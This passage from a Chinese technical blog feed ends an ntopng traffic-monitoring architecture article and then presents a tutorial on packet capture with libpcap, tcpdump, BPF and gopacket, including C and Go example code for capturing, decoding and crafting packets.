<h4 id="业务处理层"><a href="#业务处理层" class="headerlink" title="业务处理层"></a>业务处理层</h4><p>Monitoring Engine，负责采集数据的规整、压缩、转储。</p>
<h4 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h4><p><strong>Sqlite</strong>：轻型数据库，多语言支持（此处为python）<br>Gdbm：DBM的GNU版本，使用hash存储非结构化数据</p>
<p><strong>Redis</strong><br>Redis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。Ntopng的Redis数据结构如下：<br><img src="http://riboseyim-qiniu.riboseyim.com/ntopng-redis-data.png" alt=""></p>
<h4 id="前端展现层"><a href="#前端展现层" class="headerlink" title="前端展现层"></a>前端展现层</h4><p><strong>RRDtool</strong></p>
<p>源自MRTG（多路由器流量绘图器）。MRTG是有一个大学连接到互联网链路的使用率的小脚本开始的。MRTG后来被当作绘制其他数据源的工具使用，包括温度、速度、电压、输出量等等。</p>
<p><strong>Geoip：IP GIS图形</strong></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ntopng-geomap.png" alt=""></p>
<h4 id="其它库"><a href="#其它库" class="headerlink" title="其它库"></a>其它库</h4><p>autoconf、automake、pkg-config、libtool（提供通用的库编译支持）<br>Gettext、icu4c：国际化(I18N)和本地化(L10N)，多语言支持</p>
<p><strong>libffi</strong><br>“FFI” 的全名是 Foreign Function Interface，通常指的是允许以一种语言编写的代码调用另一种语言的代码。而 “Libffi” 库只提供了最底层的、与架构相关的、完整的”FFI”，因此在它之上必须有一层来负责管理两种语言之间参数的格式转换。</p>
<p>Gobject-introspection：（简称 GI）用于产生与解析 C 程序库 API 元信息，以便于动态语言（或托管语言）绑定基于 C + GObject 的程序库</p>
<p>json-glib、json-c、openssl、glib</p>
<p>libtasn1：开发 ASN.1 (Abstract Syntax Notation One) 结构管理的 C 库<br>gmp<br>Nettle：a low-level cryptographic library （加密）<br>Gnutls：（加密）<br>libpng：the official PNG reference library （图形）<br>pixman：像素管理（图形）<br>Cairo：a2Dgraphicslibrarywithsupportformultipleoutputdevices.<br>Freetype：FreeType库是一个完全免费（开源）的、高质量的且可移植的字体引擎，它提供统一的接口来访问多种字体格式文件，包括TrueType,OpenType, Type1, CID,CFF, Windows FON/FNT, X11 PCF等<br>fontconfig：字体库管理</p>
<h3 id="P2P-演示案例"><a href="#P2P-演示案例" class="headerlink" title="P2P 演示案例"></a>P2P 演示案例</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/ntop-p2p-1.jpg" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ntop-p2p-2.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ntop-p2p-3.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ntop-p2p-4.png" alt=""></p>
<hr>

<h2 id="Paper"><a href="#Paper" class="headerlink" title="Paper"></a>Paper</h2><ul>
<li><a href="http://get.influxdata.com/rs/972-GDU-533/images/Customer%20Case%20Study_%20ntop.pdf">How ntop built (an Open Source) Web-based Traffic Analysis and Flow collection with #InfluxDB</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）: OpenFlow </a></li>
</ul>
<h4 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h4><ul>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/BestAppMap/">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li>Preview:<a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/">数据可视化（五）可视化数据图表制作方法</a></li>
<li><a href="https://riboseyim.github.io/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>OpenSource</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>网络数据包的捕获、过滤和分析（Packet Capturing）</title>
    <url>/2017/06/16/Network-Pcap/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Packet Capturing Overview</li>
<li>What is Packet Capturing</li>
<li>How can it be used</li>
<li>What is libpcap</li>
<li>Debug Tools: tcpdump &amp; WinPcap &amp; snoop</li>
<li>What is BPF</li>
<li>What is gopacket</li>
</ul>
<span id="more"></span>
<h2 id="What-is-Packet-Capturing"><a href="#What-is-Packet-Capturing" class="headerlink" title="What is Packet Capturing"></a>What is Packet Capturing</h2><p>Packet capture is a computer networking term for intercepting a data packet that is crossing or moving over a specific computer network.Once a packet is captured, it is stored temporarily so that it can be analyzed. The packet is inspected to help diagnose and solve network problems and determine whether network security policies are being followed.</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Packet_Capture_Overview.png" alt="Packet Capture Overview"></p>
<h2 id="How-can-it-be-used"><a href="#How-can-it-be-used" class="headerlink" title="How can it be used"></a>How can it be used</h2><ul>
<li><p>Development<br>Testing &amp; validating &amp; Reverse engineer APP on API</p>
</li>
<li><p>Network Administration<br>Seeing what traffic goes on in background,Looking for malicious traffic on networkData capturing is used to identify security flaws and breaches by determining the point of intrusion.</p>
</li>
<li><p>Troubleshooting<br>Managed through data capturing, troubleshooting detects the occurrence of undesired events over a network and helps solve them. If the network administrator has full access to a network resource, he can access it remotely and troubleshoot any issues.</p>
</li>
<li><p>Security<br>defcon Wall of Sheep.Hackers can also use packet capturing techniques to steal data that is being transmitted over a network, like Stealing credentials.When data is stolen, the network administrator can retrieve the stolen or lost information easily using data capturing techniques.</p>
</li>
<li><p>Forensics<br>forensics for crime investigations.Whenever viruses, worms or other intrusions are detected in computers, the network administrator determines the extent of the problem. After initial analysis, she may block some segments and network traffic in order to save historical information and network data.</p>
</li>
</ul>
<h2 id="What-is-libpcap"><a href="#What-is-libpcap" class="headerlink" title="What is libpcap"></a>What is libpcap</h2><blockquote>
<p>libpcap flow involving data copy from kernel to user space.</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Packet_Capture_Flow_1.png" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Compile with: gcc find_device.c -lpcap</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> \*\*argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> \*device;</span><br><span class="line">    <span class="keyword">char</span> error_buffer[PCAP_ERRBUF_SIZE];</span><br><span class="line">    <span class="comment">//Find a device</span></span><br><span class="line">    device = pcap_lookupdev(error_buffer);</span><br><span class="line">    <span class="keyword">if</span> (device == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error finding device: %s\n&quot;</span>, error_buffer);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Network device found: %s\n&quot;</span>, device);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_packet_info</span><span class="params">(<span class="keyword">const</span> u_char \*packet, struct pcap_pkthdr packet_header)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> \*argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> \*device;</span><br><span class="line">    <span class="keyword">char</span> error_buffer[PCAP_ERRBUF_SIZE];</span><br><span class="line">    <span class="keyword">pcap_t</span> *handle;</span><br><span class="line">    <span class="keyword">const</span> u_char *packet;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">pcap_pkthdr</span> <span class="title">packet_header</span>;</span></span><br><span class="line">    <span class="keyword">int</span> packet_count_limit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> timeout_limit = <span class="number">10000</span>; <span class="comment">/*In milliseconds*/</span></span><br><span class="line"></span><br><span class="line">    device = pcap_lookupdev(error_buffer);</span><br><span class="line">    <span class="keyword">if</span> (device == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error finding device: %s\n&quot;</span>, error_buffer);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*Open device for live capture*/</span></span><br><span class="line">    handle = pcap_open_live(</span><br><span class="line">            device,</span><br><span class="line">            BUFSIZ,</span><br><span class="line">            packet_count_limit,</span><br><span class="line">            timeout_limit,</span><br><span class="line">            error_buffer</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*Attempt to capture one packet. If there is no network traffic</span></span><br><span class="line"><span class="comment">      and the timeout is reached, it will return NULL*/</span></span><br><span class="line">     packet = pcap_next(handle, &amp;packet_header);</span><br><span class="line">     <span class="keyword">if</span> (packet == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No packet found.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*Our function to output some info*/</span></span><br><span class="line">    print_packet_info(packet, packet_header);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_packet_info</span><span class="params">(<span class="keyword">const</span> u_char \*packet, struct pcap_pkthdr packet_header)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Packet capture length: %d\n&quot;</span>, packet_header.caplen);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Packet total length %d\n&quot;</span>, packet_header.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Debug-Tools"><a href="#Debug-Tools" class="headerlink" title="Debug Tools"></a>Debug Tools</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Older versions of tcpdump truncate packets to 68 or 96 bytes.</span></span><br><span class="line"><span class="comment">#If this is the case, use -s to capture full-sized packets:</span></span><br><span class="line">$ tcpdump -i &lt;interface&gt; -s 65535 -w &lt;some-file&gt;</span><br><span class="line"><span class="comment"># A packet capturing tool similar to TcpDump for Solaris</span></span><br><span class="line">$ snoop -r -o arp11.snoop -q -d nxge0 -c 150000</span><br></pre></td></tr></table></figure>
<h4 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h4><p>tcpdump 是一个运行在命令行下的嗅探工具。它允许用户拦截和显示发送或收到过网络连接到该计算机的TCP/IP和其他数据包。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息，从而使用户能够进一步找出问题的根源。可以使用 BPF 来限制tcpdump产生的数据包数量。</p>
<ul>
<li><a href="https://linuxwiki.github.io/NetTools/tcpdump.html">tcpdump使用技巧 | 潜水大叔</a></li>
</ul>
<h4 id="snoop"><a href="#snoop" class="headerlink" title="snoop"></a>snoop</h4><p>snoop uses both the network packet filter and streams buffer modules to provide efficient capture of packets from the network. Captured packets can be displayed as they are received, or saved to a file for later inspection.</p>
<h4 id="promiscuous-mode"><a href="#promiscuous-mode" class="headerlink" title="promiscuous mode"></a>promiscuous mode</h4><p>抓包工具需要工作在promiscuous mode(混杂模式)（superuser）， 指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。当网卡工作在混杂模式下时，网卡将来自接口的所有数据都捕获并交给相应的驱动程序。一般在分析网络数据作为网络故障诊断手段时用到，同时这个模式也被网络黑客利用来作为网络数据窃听的入口。</p>
<h4 id="BPF"><a href="#BPF" class="headerlink" title="BPF"></a>BPF</h4><p>Berkeley Packet Filter，缩写BPF，是类Unix系统上数据链路层的一种接口，提供原始链路层封包的收发。BPF支持“过滤”封包，这样BPF会只把“感兴趣”的封包到上层软件，可以避免从操作系统内核向用户态复制其他封包，降低抓包的CPU的负担以及所需的缓冲区空间，从而减少丢包率。BPF的过滤功能是以BPF虚拟机机器语言的解释器的形式实现的，这种语言的程序可以抓取封包数据，对封包中的数据采取算术操作，并将结果与常量或封包中的数据或结果中的测试位比较，根据比较的结果决定接受还是拒绝封包。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Packet_Capture_BPF.png" alt="BPF Overview"></p>
<h2 id="Go-Packet"><a href="#Go-Packet" class="headerlink" title="Go Packet"></a>Go Packet</h2><h3 id="Find-Devices"><a href="#Find-Devices" class="headerlink" title="Find  Devices"></a>Find  Devices</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/google/gopacket/layers&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;----------Find all devices---------\n &quot;</span>)</span><br><span class="line"></span><br><span class="line">	devices, err := pcap.FindAllDevs()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Print device information</span></span><br><span class="line">	<span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123;</span><br><span class="line">		<span class="keyword">for</span> _, address := <span class="keyword">range</span> device.Addresses &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;- IP address: &quot;</span>, address.IP)</span><br><span class="line">			fmt.Println(<span class="string">&quot;- Subnet mask: &quot;</span>, address.Netmask)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*- IP address:  45.33.110.101</span></span><br><span class="line"><span class="comment">	  - Subnet mask:  ffffff00</span></span><br><span class="line"><span class="comment">	  - IP address:  2600:3c01::f03c:91ff:fee5:45b6</span></span><br><span class="line"><span class="comment">	  - Subnet mask:  ffffffffffffffff0000000000000000</span></span><br><span class="line"><span class="comment">	  - IP address:  fe80::f03c:91ff:fee5:45b6</span></span><br><span class="line"><span class="comment">	  - Subnet mask:  ffffffffffffffff0000000000000000</span></span><br><span class="line"><span class="comment">	  - IP address:  127.0.0.1</span></span><br><span class="line"><span class="comment">	  - Subnet mask:  ff000000</span></span><br><span class="line"><span class="comment">	  - IP address:  ::1</span></span><br><span class="line"><span class="comment">	  - Subnet mask:  ffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Decoding-Packet-Layers"><a href="#Decoding-Packet-Layers" class="headerlink" title="Decoding Packet Layers"></a>Decoding Packet Layers</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/Packet_Capture_Flow_2.png" alt=""></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/google/gopacket/layers&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	handle, err := pcap.OpenLive(<span class="string">&quot;eth0&quot;</span>, <span class="number">65536</span>, <span class="literal">true</span>, pcap.BlockForever)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Error: %s\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Create a new PacketDataSource</span></span><br><span class="line">	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)</span><br><span class="line">	<span class="comment">//Packets returns a channel of packets</span></span><br><span class="line">	in := src.Packets()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> packet gopacket.Packet</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="comment">//case &lt;-stop:</span></span><br><span class="line">		<span class="comment">//return</span></span><br><span class="line">		<span class="keyword">case</span> packet = &lt;-in:</span><br><span class="line">			arpLayer := packet.Layer(layers.LayerTypeARP)</span><br><span class="line">			<span class="keyword">if</span> arpLayer == <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			arp := arpLayer.(*layers.ARP)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> net.HardwareAddr(arp.SourceHwAddress).String() == <span class="string">&quot;abc&quot;</span> &#123;</span><br><span class="line">				<span class="comment">//Do something or don&#x27;t</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			tcpLayer := packet.Layer(layers.LayerTypeTCP)</span><br><span class="line">			<span class="keyword">if</span> tcpLayer == <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			tcp := tcpLayer.(*layers.TCP)</span><br><span class="line"></span><br><span class="line">			......</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Creating-and-Sending-Packets"><a href="#Creating-and-Sending-Packets" class="headerlink" title="Creating and Sending Packets"></a>Creating and Sending Packets</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket/layers&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    device       <span class="keyword">string</span> = <span class="string">&quot;eth0&quot;</span></span><br><span class="line">    snapshot_len <span class="keyword">int32</span>  = <span class="number">1024</span></span><br><span class="line">    promiscuous  <span class="keyword">bool</span>   = <span class="literal">false</span></span><br><span class="line">    err          error</span><br><span class="line">    timeout      time.Duration = <span class="number">30</span> * time.Second</span><br><span class="line">    handle       *pcap.Handle</span><br><span class="line">    buffer       gopacket.SerializeBuffer</span><br><span class="line">    options      gopacket.SerializeOptions</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Open device</span></span><br><span class="line">    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;log.Fatal(err) &#125;</span><br><span class="line">    <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send raw bytes over wire</span></span><br><span class="line">    rawBytes := []<span class="keyword">byte</span>&#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;</span><br><span class="line">    err = handle.WritePacketData(rawBytes)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a properly formed packet, just with</span></span><br><span class="line">    <span class="comment">// empty details. Should fill out MAC addresses,</span></span><br><span class="line">    <span class="comment">// IP addresses, etc.</span></span><br><span class="line">    buffer = gopacket.NewSerializeBuffer()</span><br><span class="line">    gopacket.SerializeLayers(buffer, options,</span><br><span class="line">        &amp;layers.Ethernet&#123;&#125;,</span><br><span class="line">        &amp;layers.IPv4&#123;&#125;,</span><br><span class="line">        &amp;layers.TCP&#123;&#125;,</span><br><span class="line">        gopacket.Payload(rawBytes),</span><br><span class="line">    )</span><br><span class="line">    outgoingPacket := buffer.Bytes()</span><br><span class="line">    <span class="comment">// Send our packet</span></span><br><span class="line">    err = handle.WritePacketData(outgoingPacket)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This time lets fill out some information</span></span><br><span class="line">    ipLayer := &amp;layers.IPv4&#123;</span><br><span class="line">        SrcIP: net.IP&#123;<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        DstIP: net.IP&#123;<span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    ethernetLayer := &amp;layers.Ethernet&#123;</span><br><span class="line">        SrcMAC: net.HardwareAddr&#123;<span class="number">0xFF</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>, <span class="number">0xAA</span>, <span class="number">0xFF</span>, <span class="number">0xAA</span>&#125;,</span><br><span class="line">        DstMAC: net.HardwareAddr&#123;<span class="number">0xBD</span>, <span class="number">0xBD</span>, <span class="number">0xBD</span>, <span class="number">0xBD</span>, <span class="number">0xBD</span>, <span class="number">0xBD</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    tcpLayer := &amp;layers.TCP&#123;</span><br><span class="line">        SrcPort: layers.TCPPort(<span class="number">4321</span>),</span><br><span class="line">        DstPort: layers.TCPPort(<span class="number">80</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// And create the packet with the layers</span></span><br><span class="line">    buffer = gopacket.NewSerializeBuffer()</span><br><span class="line">    gopacket.SerializeLayers(buffer, options,</span><br><span class="line">        ethernetLayer,</span><br><span class="line">        ipLayer,</span><br><span class="line">        tcpLayer,</span><br><span class="line">        gopacket.Payload(rawBytes),</span><br><span class="line">    )</span><br><span class="line">    outgoingPacket = buffer.Bytes()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Capture-Packet-Workflow"><a href="#Capture-Packet-Workflow" class="headerlink" title="Capture Packet Workflow"></a>Capture Packet Workflow</h4><ul>
<li>Getting a list of network devices</li>
<li>Capturing packets from a network device</li>
<li>Analyzing packet layers</li>
<li>Using Berkeley Packet Filters</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Network_Protocol_Packet.png" alt=""></p>
<h2 id="Demo-amp-Repository"><a href="#Demo-amp-Repository" class="headerlink" title="Demo &amp; Repository"></a>Demo &amp; Repository</h2><ul>
<li><a href="http://www.devdungeon.com/content/using-libpcap-c">using libpcap c</a></li>
<li><a href="http://www.binarytides.com/packet-sniffer-code-c-libpcap-linux-sockets">packet sniffer code c</a></li>
<li><a href="https://www.scalawilliam.com/scala-native-libpcap">scala native libpcap</a></li>
<li><a href="https://godoc.org/github.com/google/gopacket">gopacket</a></li>
<li><a href="https://libraries.io/github/open-ch/goProbe">goProbe</a></li>
</ul>
<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><ul>
<li><a href="https://github.com/zond/qisniff">qisniff</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.ntop.org/products/packet-capture/pf_ring/">ntop:pf_ring</a></li>
<li><a href="http://www.ntop.org/products/packet-capture/pf_ring/pf_ring-zc-zero-copy/">ntop:pf_ring zero copy</a></li>
<li><a href="http://jaseywang.me/2015/01/22/pf_ring-%E5%AF%B9%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E6%80%A7%E8%83%BD%E7%9A%84%E6%8F%90%E5%8D%87%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AF-30-40/">jaseywang:pf_ring对网络抓包性能的提升</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4Nzg5Nzc5OA==&amp;mid=2651659827&amp;idx=1&amp;sn=3324025e2f4fb2c494676bf01d67427f&amp;scene=1&amp;srcid=0525Wyio4YnzoUz9oJ60Zmdu#rd">胥峰(盛大游戏)：网络分析技术之葵花宝典</a></li>
<li><a href="https://segmentfault.com/a/1190000007967510">基于网络抓包实现kubernetes中微服务的应用级监控</a></li>
</ul>
<h2 id="拓展话题：SDN-网络中的可视化与数据封包"><a href="#拓展话题：SDN-网络中的可视化与数据封包" class="headerlink" title="拓展话题：SDN 网络中的可视化与数据封包"></a>拓展话题：SDN 网络中的可视化与数据封包</h2><ul>
<li>DPDK(Data Plane Development Kit)<br>运行于Intel X86平台，是 Intel 开源的一组快速处理数据包的开发平台及接口（BSD）。重载了网卡驱动，该驱动在收到数据包后不中断通知CPU，而是将数据包通过零拷贝技术存入内存，这时应用层程序就可以通过DPDK提供的接口，直接从内存读取数据包。这种处理方式节省了CPU中断时间、内存拷贝时间，并向应用层提供了简单易行且高效的数据包处理方式，使得网络应用的开发更加方便。</li>
</ul>
<h2 id="专题合辑：Network-Engineering"><a href="#专题合辑：Network-Engineering" class="headerlink" title="专题合辑：Network Engineering"></a>专题合辑：Network Engineering</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li>Preview <a href="https://riboseyim.github.io/2017/10/16/SDN-Controller/">SDN 技术指南（三）：OpenDaylight or Floodlight ?</a></li>
<li><a href="https://riboseyim.github.io/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li>Preview <a href="#">SDN 技术指南（五）：NFV</a></li>
<li>Preview <a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
